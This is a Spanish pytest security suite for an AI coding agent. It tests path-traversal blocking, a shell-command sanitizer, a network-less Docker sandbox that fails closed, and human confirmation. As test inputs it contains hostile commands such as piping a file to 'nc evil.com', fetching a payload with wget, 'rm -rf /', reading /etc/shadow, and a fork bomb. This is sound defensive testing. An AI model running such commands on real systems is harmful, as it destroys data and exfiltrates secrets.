"""
FASE 4.5 — Pruebas de seguridad con política fail-closed.

Política: TODOS los comandos se ejecutan dentro del sandbox Docker.
Si Docker no está disponible, NINGÚN comando se ejecuta en el host.

Categorías:
1. Filesystem (WorkspaceManager): traversal, symlinks, archivos protegidos
2. Bash (CommandSanitizer): injection, comandos prohibidos
3. Fail-closed: pytest, ls, git, python — TODOS bloqueados sin Docker
4. Sandbox Docker (requiere Docker): aislamiento real
5. DRY helpers
6. Confirmación humana
"""

import os
import sys
import pytest
from pathlib import Path

# Añadir proyecto al path
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from seguridad import WorkspaceManager, CommandSanitizer, AuditLogger
from sandbox import SandboxManager
from herramientas import (
    set_active_workspace, _validar_ruta_o_error, _is_binary_file,
    leer_archivo, escribir_archivo, editar_archivo,
    listar_directorio, buscar_en_proyecto, ejecutar_comando_bash,
)


# ── Fixtures ─────────────────────────────────────────────────────

@pytest.fixture
def temp_workspace(tmp_path):
    """Crea un workspace temporal aislado para cada prueba."""
    ws = tmp_path / "test_workspace"
    ws.mkdir()
    set_active_workspace(ws)
    yield ws
    set_active_workspace(BASE_DIR)


@pytest.fixture
def ws_manager(temp_workspace):
    return WorkspaceManager(temp_workspace)


@pytest.fixture
def cmd_sanitizer(ws_manager):
    return CommandSanitizer(ws_manager)


# Helper para detectar Docker
def _docker_is_running():
    """Verifica si Docker daemon está corriendo. No cachea."""
    import subprocess
    try:
        r = subprocess.run(["docker", "info"], capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


DOCKER_RUNNING = _docker_is_running()
requires_docker = pytest.mark.skipif(
    not DOCKER_RUNNING, reason="Docker daemon no está corriendo"
)


# ═══════════════════════════════════════════════════════════════════
# 1. FILESYSTEM — WorkspaceManager
# ═══════════════════════════════════════════════════════════════════

class TestFilesystemTraversal:
    """Pruebas de path traversal."""

    def test_traversal_basico(self, ws_manager):
        result = ws_manager.validar_ruta("../../../etc/passwd")
        assert not result["valida"]
        assert result["codigo_error"] == "FUERA_DEL_WORKSPACE"

    def test_traversal_absoluto(self, ws_manager):
        result = ws_manager.validar_ruta("/etc/passwd")
        assert not result["valida"]
        assert result["codigo_error"] == "FUERA_DEL_WORKSPACE"

    def test_traversal_home(self, ws_manager):
        result = ws_manager.validar_ruta(os.path.expanduser("~/.ssh/id_rsa"))
        assert not result["valida"]

    def test_traversal_otro_proyecto(self, ws_manager):
        result = ws_manager.validar_ruta("/Users/danielcifuentes/Desktop/otro_proyecto/main.py")
        assert not result["valida"]

    def test_ruta_relativa_valida(self, ws_manager, temp_workspace):
        (temp_workspace / "test.py").write_text("print('hello')")
        result = ws_manager.validar_ruta("test.py", must_exist=True)
        assert result["valida"]

    def test_ruta_punto_valida(self, ws_manager):
        result = ws_manager.validar_ruta(".", must_exist=True)
        assert result["valida"]

    def test_ruta_none(self, ws_manager):
        result = ws_manager.validar_ruta(None)
        assert not result["valida"]
        assert result["codigo_error"] == "ENTRADA_NULA"

    def test_ruta_vacia(self, ws_manager):
        result = ws_manager.validar_ruta("")
        assert not result["valida"]
        assert result["codigo_error"] == "RUTA_VACIA"


class TestFilesystemSymlinks:
    """Pruebas de symlinks."""

    def test_symlink_fuera_workspace(self, ws_manager, temp_workspace):
        link_path = temp_workspace / "link_malicioso"
        try:
            link_path.symlink_to("/etc")
            result = ws_manager.validar_ruta("link_malicioso", must_exist=True)
            assert not result["valida"]
            assert result["codigo_error"] == "FUERA_DEL_WORKSPACE"
        finally:
            if link_path.exists() or link_path.is_symlink():
                link_path.unlink()

    def test_symlink_interno_valido(self, ws_manager, temp_workspace):
        sub_dir = temp_workspace / "subdir"
        sub_dir.mkdir()
        target = sub_dir / "target.txt"
        target.write_text("contenido")
        link_path = temp_workspace / "link_interno"
        link_path.symlink_to(target)
        result = ws_manager.validar_ruta("link_interno", must_exist=True)
        assert result["valida"]


class TestFilesystemProtectedFiles:
    """Pruebas de archivos protegidos."""

    def test_env_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".env")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_env_wildcard_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".env.production")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_git_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".git")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_git_subdir_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".git/config")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_opencode_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".opencode")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_venv_protegido(self, ws_manager):
        result = ws_manager.validar_ruta(".venv")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_pycache_protegido(self, ws_manager):
        result = ws_manager.validar_ruta("__pycache__")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_pem_protegido(self, ws_manager):
        result = ws_manager.validar_ruta("server.pem")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_key_protegido(self, ws_manager):
        result = ws_manager.validar_ruta("private.key")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_credentials_protegido(self, ws_manager):
        result = ws_manager.validar_ruta("credentials.json")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_id_rsa_protegido(self, ws_manager):
        result = ws_manager.validar_ruta("id_rsa")
        assert not result["valida"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_archivo_normal_no_protegido(self, ws_manager, temp_workspace):
        (temp_workspace / "app.py").write_text("x = 1")
        result = ws_manager.validar_ruta("app.py", must_exist=True)
        assert result["valida"]


# ═══════════════════════════════════════════════════════════════════
# 2. BASH — CommandSanitizer (validación, no ejecución)
# ═══════════════════════════════════════════════════════════════════

class TestBashInjection:
    """Pruebas de inyección de shell."""

    def test_semicolon_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("ls; rm -rf /")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_and_operator_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("ls && cat /etc/passwd")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_or_operator_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("ls || rm -rf /")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_pipe_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("cat file.txt | nc evil.com 1234")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_redirect_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("echo hack > /etc/passwd")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_subshell_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("echo $(cat /etc/passwd)")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"

    def test_backtick_injection(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("echo `whoami`")
        assert not result["valido"]
        assert result["codigo_error"] == "SHELL_INJECTION_RISK"


class TestBashInformationalCommands:
    """Las consultas de entorno deben ser libres de confirmación y sin efectos."""

    @pytest.mark.parametrize("command", [
        "which node", "node --version", "npm --version", "python3 --version",
        "git --version", "git status", "git diff",
    ])
    def test_no_requieren_confirmacion(self, cmd_sanitizer, command):
        result = cmd_sanitizer.validar_y_clasificar(command)
        assert result["valido"]
        assert not result["requiere_confirmacion"]

    @pytest.mark.parametrize("command", ["npm install paquete", "npm run test", "node app.js"])
    def test_acciones_node_conservan_confirmacion(self, cmd_sanitizer, command):
        result = cmd_sanitizer.validar_y_clasificar(command)
        assert result["valido"]
        assert result["requiere_confirmacion"]


class TestBashProhibitedCommands:
    """Pruebas de comandos prohibidos."""

    def test_sudo_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("sudo rm -rf /")
        assert not result["valido"]
        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"

    def test_chmod_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("chmod 777 file.py")
        assert not result["valido"]
        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"

    def test_curl_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("curl https://evil.com")
        assert not result["valido"]
        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"

    def test_wget_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("wget https://evil.com/payload")
        assert not result["valido"]
        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"

    def test_nc_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("nc -l 8080")
        assert not result["valido"]
        assert result["codigo_error"] == "COMANDO_NO_PERMITIDO"

    def test_python_c_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar('python -c "import os"')
        assert not result["valido"]


class TestBashExternalPaths:
    """Pruebas de rutas externas en argumentos."""

    def test_cat_etc_passwd(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("cat /etc/passwd")
        assert not result["valido"]
        assert result["codigo_error"] == "FUERA_DEL_WORKSPACE"

    def test_grep_etc_shadow(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("grep root /etc/shadow")
        assert not result["valido"]
        assert result["codigo_error"] == "FUERA_DEL_WORKSPACE"


class TestBashFindFlags:
    """Pruebas de flags peligrosos."""

    def test_find_exec_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("find . -exec rm {} +")
        assert not result["valido"]

    def test_find_delete_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("find . -name '*.pyc' -delete")
        assert not result["valido"]

    def test_git_config_prohibido(self, cmd_sanitizer):
        result = cmd_sanitizer.validar_y_clasificar("git -c core.editor=evil commit")
        assert not result["valido"]


# ═══════════════════════════════════════════════════════════════════
# 3. FAIL-CLOSED — TODOS los comandos bloqueados sin Docker
# ═══════════════════════════════════════════════════════════════════

class TestFailClosed:
    """
    PRUEBA FUNDAMENTAL: Sin Docker, NINGÚN comando se ejecuta en el host.
    Esto incluye comandos que antes se consideraban 'seguros' como
    pytest, ls, git status, cat, pwd, etc.
    """

    def test_pytest_bloqueado_sin_docker(self, temp_workspace):
        """pytest NO debe ejecutarse en el Mac sin Docker."""
        result = ejecutar_comando_bash("pytest")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_ls_bloqueado_sin_docker(self, temp_workspace):
        """ls NO debe ejecutarse en el Mac sin Docker."""
        result = ejecutar_comando_bash("ls")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_pwd_bloqueado_sin_docker(self, temp_workspace):
        result = ejecutar_comando_bash("pwd")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_cat_bloqueado_sin_docker(self, temp_workspace):
        (temp_workspace / "test.txt").write_text("hello")
        result = ejecutar_comando_bash("cat test.txt")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_git_status_bloqueado_sin_docker(self, temp_workspace):
        result = ejecutar_comando_bash("git status")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_python_script_bloqueado_sin_docker(self, temp_workspace):
        """python3 script.py NO debe ejecutarse en el Mac sin Docker."""
        (temp_workspace / "script.py").write_text("print('hello')")
        cs = CommandSanitizer(WorkspaceManager(temp_workspace))
        result = cs.ejecutar_comando("python3 script.py", aprobar_confirmacion=True)
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_grep_bloqueado_sin_docker(self, temp_workspace):
        result = ejecutar_comando_bash("grep test .")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_find_bloqueado_sin_docker(self, temp_workspace):
        result = ejecutar_comando_bash("find . -name '*.py'")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_head_bloqueado_sin_docker(self, temp_workspace):
        result = ejecutar_comando_bash("head -5 test.py")
        if not DOCKER_RUNNING:
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_confirmacion_antes_sandbox(self, temp_workspace):
        """Comandos que requieren confirmación deben pedirla ANTES de sandbox."""
        result = ejecutar_comando_bash("rm test.txt")
        assert result["error"]
        assert result["codigo_error"] == "CONFIRMACION_REQUERIDA"

    def test_no_ejecucion_local_directa(self, temp_workspace):
        """Verificar que ejecutar_comando NO tiene subprocess.Popen local."""
        import inspect
        source = inspect.getsource(CommandSanitizer.ejecutar_comando)
        assert "subprocess.Popen" not in source, \
            "ejecutar_comando NO debe contener subprocess.Popen"

    def test_no_get_sanitized_environment(self):
        """Verificar que _get_sanitized_environment fue eliminado."""
        assert not hasattr(CommandSanitizer, "_get_sanitized_environment"), \
            "_get_sanitized_environment debe ser eliminado (no hay ejecución local)"


# ═══════════════════════════════════════════════════════════════════
# 4. SANDBOX DOCKER — Aislamiento real (requiere Docker corriendo)
# ═══════════════════════════════════════════════════════════════════

class TestSandboxDockerIsolation:
    """
    Pruebas que EJECUTAN contenedores Docker y verifican aislamiento real.
    Se saltan automáticamente si Docker no está corriendo.
    """

    @requires_docker
    def test_ls_en_sandbox(self, temp_workspace):
        """Verificar que ls funciona dentro del sandbox."""
        (temp_workspace / "hello.txt").write_text("world")
        result = ejecutar_comando_bash("ls")
        assert not result["error"]
        assert "hello.txt" in result["stdout"]
        assert result.get("sandbox") is True

    @requires_docker
    def test_pytest_en_sandbox(self, temp_workspace):
        """Verificar que pytest se ejecuta dentro del sandbox."""
        (temp_workspace / "test_demo.py").write_text(
            "def test_sum():\n    assert 1 + 1 == 2\n"
        )
        result = ejecutar_comando_bash("pytest test_demo.py -v")
        assert result.get("sandbox") is True

    @requires_docker
    def test_no_acceso_etc_passwd(self, temp_workspace):
        """Dentro del sandbox, /etc/passwd del HOST no es accesible."""
        cs = CommandSanitizer(WorkspaceManager(temp_workspace))
        result = cs.ejecutar_comando("cat /etc/passwd", aprobar_confirmacion=True)
        # Esto es bloqueado por CommandSanitizer antes de llegar al sandbox
        # porque /etc/passwd es una ruta fuera del workspace
        assert result["error"]

    @requires_docker
    def test_no_acceso_home_host(self, temp_workspace):
        """Dentro del sandbox, $HOME del host no es accesible."""
        cs = CommandSanitizer(WorkspaceManager(temp_workspace))
        sm = SandboxManager(temp_workspace)
        # Ejecutar directamente en sandbox para verificar aislamiento OS
        result = sm.execute(["ls", "/Users"])
        assert result["error"] or "No such file" in result.get("stderr", "")

    @requires_docker
    def test_no_acceso_ssh(self, temp_workspace):
        """Dentro del sandbox, .ssh del host no es accesible."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["ls", "/root/.ssh"])
        assert result["error"] or "No such file" in result.get("stderr", "") or \
               "Permission denied" in result.get("stderr", "")

    @requires_docker
    def test_no_acceso_docker_socket(self, temp_workspace):
        """Dentro del sandbox, el Docker socket no es accesible."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["ls", "/var/run/docker.sock"])
        assert result["error"] or "No such file" in result.get("stderr", "")

    @requires_docker
    def test_red_desactivada(self, temp_workspace):
        """Red debe estar desactivada dentro del sandbox."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(
            ["python3", "-c", "import socket; s=socket.socket(); s.settimeout(2); s.connect(('8.8.8.8', 53))"],
            timeout_sec=10
        )
        assert result["error"], "La conexión de red debería fallar dentro del sandbox"

    @requires_docker
    def test_no_escribir_fuera_workspace(self, temp_workspace):
        """No se puede escribir fuera de /workspace dentro del sandbox."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(
            ["python3", "-c", "open('/etc/test_file', 'w').write('hack')"],
            timeout_sec=5
        )
        assert result["error"]

    @requires_docker
    def test_usuario_no_root(self, temp_workspace):
        """El proceso dentro del sandbox ejecuta como usuario no-root."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["id"])
        assert not result["error"]
        assert "uid=1000" in result["stdout"]
        assert "root" not in result["stdout"]

    @requires_docker
    def test_python_ejecuta_en_sandbox(self, temp_workspace):
        """Python dentro del sandbox funciona correctamente."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["python3", "-c", "print('sandbox_ok')"])
        assert not result["error"]
        assert "sandbox_ok" in result["stdout"]

    @requires_docker
    def test_node_y_npm_version_en_sandbox(self, temp_workspace):
        """Verificar que node y npm funcionan en el sandbox y reportan versión."""
        sm = SandboxManager(temp_workspace)
        res_node = sm.execute(["node", "--version"])
        assert not res_node.get("error")
        assert "v22" in res_node.get("stdout", "") or "v2" in res_node.get("stdout", "")

        res_npm = sm.execute(["npm", "--version"])
        assert not res_npm.get("error")

    @requires_docker
    def test_node_ejecuta_script_workspace(self, temp_workspace):
        """Verificar que node puede ejecutar un archivo .js dentro del workspace."""
        (temp_workspace / "test_app.js").write_text("console.log('JS_SANDBOX_OK');")
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["node", "test_app.js"])
        assert not result.get("error")
        assert "JS_SANDBOX_OK" in result.get("stdout", "")

    @requires_docker
    def test_node_no_acceso_filesystem_root(self, temp_workspace):
        """Node no debe poder escribir fuera de /workspace dentro del sandbox."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["node", "-e", "require('fs').writeFileSync('/test.txt', 'fail')"])
        assert result.get("error") or "Read-only file system" in result.get("stderr", "")

    @requires_docker
    def test_node_sin_red(self, temp_workspace):
        """Node no debe poder realizar conexiones de red dentro del sandbox."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["node", "-e", "require('http').get('http://8.8.8.8', (r) => {}).on('error', (e) => { process.exit(1); })"])
        assert result.get("error") or result.get("codigo_salida") != 0

    @requires_docker
    def test_node_no_acceso_docker_socket(self, temp_workspace):
        """Node no debe tener acceso a /var/run/docker.sock."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(["node", "-e", "require('fs').statSync('/var/run/docker.sock')"])
        assert result.get("error") or "ENOENT" in result.get("stderr", "")

    def test_docker_build_context_jamás_es_workspace_usuario(self, temp_workspace):
        """Verifica que el contexto de docker build es la ruta del agente y nunca el workspace del usuario."""
        sm = SandboxManager(temp_workspace)
        assert sm.workspace_root == temp_workspace
        from sandbox import AGENT_DOCKER_DIR
        assert AGENT_DOCKER_DIR != temp_workspace
        assert AGENT_DOCKER_DIR.name == "docker"
        assert (AGENT_DOCKER_DIR / "Dockerfile.sandbox").exists()

    @requires_docker
    def test_global_clis_en_sandbox(self, temp_workspace):
        """Verificar que las CLIs globales de desarrollo existen en el sandbox."""
        sm = SandboxManager(temp_workspace)
        for cli in ["tsc", "nest", "vite", "eslint", "prettier", "vitest", "pytest"]:
            res = sm.execute([cli, "--version"])
            assert not res.get("error"), f"CLI {cli} no disponible: {res.get('stderr')}"

    @requires_docker
    def test_express_tarball_install_y_ejecucion_offline(self, temp_workspace):
        """Probar el flujo completo: mapa offline, instalación atómica por tarball, node_modules local y require."""
        sm = SandboxManager(temp_workspace)
        pkg_map = sm.get_offline_package_map()
        assert "express" in pkg_map, "express debe estar pre-cargado en /var/pkg-store"

        express_tarball = pkg_map["express"]
        target_tarballs = [
            express_tarball,
            pkg_map.get("body-parser"),
            pkg_map.get("cookie"),
            pkg_map.get("debug"),
        ]
        target_tarballs = [t for t in target_tarballs if t]
        res_inst = sm.execute(["npm", "install", "--no-audit", "--no-fund", "--cache", "/tmp/.npm"] + target_tarballs, timeout_sec=30)
        assert not res_inst.get("error"), f"Fallo al instalar tarballs: {res_inst.get('mensaje') or res_inst.get('stderr')}"
        assert (temp_workspace / "node_modules" / "express").exists()
        assert (temp_workspace / "package.json").exists()

        # Script node importe express de /workspace/node_modules sin NODE_PATH
        (temp_workspace / "app_express.js").write_text(
            "const express = require('express'); console.log('EXPRESS_IMPORT_OK');"
        )
        res_run = sm.execute(["node", "app_express.js"])
        assert not res_run.get("error")
        assert "EXPRESS_IMPORT_OK" in res_run.get("stdout", "")

    @requires_docker
    def test_no_node_path_en_sandbox_env(self, temp_workspace):
        """Confirmar que NODE_PATH no está definido en el sandbox."""
        sm = SandboxManager(temp_workspace)
        res = sm.execute(["node", "-e", "console.log(process.env.NODE_PATH || 'EMPTY');"])
        assert not res.get("error")
        assert "EMPTY" in res.get("stdout", "")

    @requires_docker
    def test_pkg_store_is_read_only(self, temp_workspace):
        """Confirmar que /var/pkg-store es inmutable y retorna EROFS al intentar escribir."""
        sm = SandboxManager(temp_workspace)
        res = sm.execute(["node", "-e", "require('fs').writeFileSync('/var/pkg-store/test.txt', 'x');"])
        assert res.get("error") or "Read-only file system" in res.get("stderr", "")

    @requires_docker
    def test_uncached_package_fails_without_network(self, temp_workspace):
        """Confirmar que la instalación de un paquete no precargado falla sin acceso a red."""
        sm = SandboxManager(temp_workspace)
        res = sm.execute(["npm", "install", "uncached-pkg-999"])
        assert res.get("error") or res.get("codigo_salida") != 0

    @requires_docker
    def test_pids_limit(self, temp_workspace):
        """Fork bomb debe ser detenida por el límite de PIDs."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(
            ["python3", "-c", "import os\nfor _ in range(200): os.fork()"],
            timeout_sec=10
        )
        # Esperamos error por límite de PIDs o timeout
        assert result["error"]

    @requires_docker
    def test_symlink_no_escapa(self, temp_workspace):
        """Un symlink creado dentro del sandbox no puede escapar a /."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(
            ["python3", "-c", "import os; os.symlink('/etc/passwd', '/workspace/evil_link'); print(open('/workspace/evil_link').read())"],
            timeout_sec=5
        )
        # El symlink apunta a /etc/passwd del CONTENEDOR, no del host
        # Pero el filesystem raíz es read-only, así que incluso si lee /etc/passwd
        # del contenedor, eso no es el del host
        # La prueba verifica que sandbox: True está presente
        assert result.get("sandbox") is True

    @requires_docker
    def test_escritura_workspace_permitida(self, temp_workspace):
        """Escritura en /workspace (el workspace) debe funcionar."""
        sm = SandboxManager(temp_workspace)
        result = sm.execute(
            ["python3", "-c", "open('/workspace/new_file.txt', 'w').write('written_in_sandbox')"],
            timeout_sec=5
        )
        assert not result["error"]
        # Verificar que el archivo realmente se creó en el host
        created_file = temp_workspace / "new_file.txt"
        assert created_file.exists()
        assert created_file.read_text() == "written_in_sandbox"


# ═══════════════════════════════════════════════════════════════════
# 5. SANDBOX MANAGER — Comportamiento básico
# ═══════════════════════════════════════════════════════════════════

class TestSandboxManagerBehavior:
    """Pruebas del comportamiento de SandboxManager."""

    def test_is_available_no_crashea(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        result = sm.is_available()
        assert isinstance(result, bool)

    def test_execute_sin_docker_retorna_error(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        if not sm.is_available():
            result = sm.execute(["ls"], timeout_sec=5)
            assert result["error"]
            assert result["codigo_error"] == "SANDBOX_NO_DISPONIBLE"

    def test_sandbox_no_tiene_enable_network(self):
        """Verificar que execute() NO acepta enable_network."""
        import inspect
        sig = inspect.signature(SandboxManager.execute)
        param_names = list(sig.parameters.keys())
        assert "enable_network" not in param_names, \
            "SandboxManager.execute NO debe tener parámetro enable_network"

    def test_build_docker_command_tiene_network_none(self, temp_workspace):
        """Verificar que --network none SIEMPRE está presente."""
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {"HOME": "/workspace"})
        assert "--network" in cmd
        network_idx = cmd.index("--network")
        assert cmd[network_idx + 1] == "none"

    def test_build_docker_command_solo_monta_workspace(self, temp_workspace):
        """Verificar que solo el workspace se monta como volumen."""
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {"HOME": "/workspace"})
        volume_flags = [cmd[i + 1] for i, v in enumerate(cmd) if v == "-v"]
        assert len(volume_flags) == 1, "Solo debe haber un montaje de volumen"
        assert volume_flags[0].startswith(str(temp_workspace))
        assert ":/workspace:rw" in volume_flags[0]

    def test_build_docker_command_sin_capabilities(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {})
        assert "--cap-drop" in cmd
        cap_idx = cmd.index("--cap-drop")
        assert cmd[cap_idx + 1] == "ALL"

    def test_build_docker_command_usuario_no_root(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {})
        assert "--user" in cmd
        user_idx = cmd.index("--user")
        assert cmd[user_idx + 1] == "1000:1000"

    def test_build_docker_command_read_only(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {})
        assert "--read-only" in cmd

    def test_build_docker_command_pids_limit(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {})
        assert "--pids-limit" in cmd

    def test_build_docker_command_memory_limit(self, temp_workspace):
        sm = SandboxManager(temp_workspace)
        cmd = sm._build_docker_command(["ls"], {})
        assert "--memory" in cmd

    def test_env_no_contiene_secrets(self, temp_workspace):
        """Verificar que el env del sandbox no contiene secretos."""
        sm = SandboxManager(temp_workspace)
        env = sm._get_sandbox_env()
        for key in env:
            assert "API" not in key.upper()
            assert "KEY" not in key.upper()
            assert "SECRET" not in key.upper()
            assert "TOKEN" not in key.upper()
            assert "PASSWORD" not in key.upper()


# ═══════════════════════════════════════════════════════════════════
# 6. HERRAMIENTAS — Integración con WorkspaceManager
# ═══════════════════════════════════════════════════════════════════

class TestHerramientasIntegration:
    """Verificar que las herramientas de filesystem usan WorkspaceManager."""

    def test_leer_archivo_fuera_workspace(self, temp_workspace):
        result = leer_archivo("/etc/passwd")
        assert result["error"]

    def test_escribir_archivo_fuera_workspace(self, temp_workspace):
        result = escribir_archivo("/tmp/hack.txt", "malicioso")
        assert result["error"]

    def test_editar_archivo_fuera_workspace(self, temp_workspace):
        result = editar_archivo("/etc/hosts", "old", "new")
        assert result["error"]

    def test_listar_directorio_fuera_workspace(self, temp_workspace):
        result = listar_directorio("/etc")
        assert result["error"]

    def test_buscar_fuera_workspace(self, temp_workspace):
        result = buscar_en_proyecto("root", "/etc")
        assert result["error"]

    def test_leer_archivo_protegido(self, temp_workspace):
        result = leer_archivo(".env")
        assert result["error"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"

    def test_escribir_archivo_protegido(self, temp_workspace):
        result = escribir_archivo(".env", "KEY=VALUE")
        assert result["error"]
        assert result["codigo_error"] == "ARCHIVO_PROTEGIDO"


# ═══════════════════════════════════════════════════════════════════
# 7. DRY HELPERS
# ═══════════════════════════════════════════════════════════════════

class TestDryHelpers:
    """Pruebas de los helpers DRY."""

    def test_validar_ruta_o_error_valida(self, temp_workspace):
        (temp_workspace / "test.txt").write_text("hello")
        path, val = _validar_ruta_o_error("test.txt", must_exist=True)
        assert path is not None
        assert val["valida"]

    def test_validar_ruta_o_error_invalida(self, temp_workspace):
        path, error = _validar_ruta_o_error("/etc/passwd")
        assert path is None
        assert error["error"]

    def test_is_binary_file_texto(self, temp_workspace):
        f = temp_workspace / "text.txt"
        f.write_text("hello world")
        assert not _is_binary_file(f)

    def test_is_binary_file_binario(self, temp_workspace):
        f = temp_workspace / "binary.bin"
        f.write_bytes(b"\x00\x01\x02\x03")
        assert _is_binary_file(f)


# ═══════════════════════════════════════════════════════════════════
# 8. CONFIRMACIÓN HUMANA
# ═══════════════════════════════════════════════════════════════════

class TestConfirmacionHumana:
    """Verificar que el LLM no puede auto-aprobar operaciones."""

    def test_rm_sin_confirmacion_bloqueado(self, temp_workspace):
        (temp_workspace / "archivo.txt").write_text("datos")
        result = ejecutar_comando_bash("rm archivo.txt")
        assert result["error"]
        assert result["codigo_error"] == "CONFIRMACION_REQUERIDA"

    def test_pip_sin_confirmacion_bloqueado(self, temp_workspace):
        result = ejecutar_comando_bash("pip install malware")
        assert result["error"]
        assert result["codigo_error"] == "CONFIRMACION_REQUERIDA"

    def test_ejecutar_comando_bash_no_expone_aprobar(self):
        """
        Verificar que ejecutar_comando_bash NO tiene parámetro aprobar_confirmacion.
        """
        import inspect
        sig = inspect.signature(ejecutar_comando_bash)
        param_names = list(sig.parameters.keys())
        assert "aprobar_confirmacion" not in param_names, \
            "ejecutar_comando_bash NO debe exponer 'aprobar_confirmacion' al LLM"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
